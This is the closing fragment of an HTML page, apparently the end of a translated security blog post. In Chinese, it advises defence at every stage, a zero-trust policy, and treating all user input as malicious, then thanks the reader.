ox js jt ju oy jw jx jy oz ka kb kc pa ke kf kg pb ki kj kk ij bi translated">基本原则是加强每个阶段的防御机制，并执行零信任政策。用户输入应该总是被认为是恶意的。<strong class="jp ir">感谢阅读！直到下一次。</strong></p></div></div>    
</body>
</html>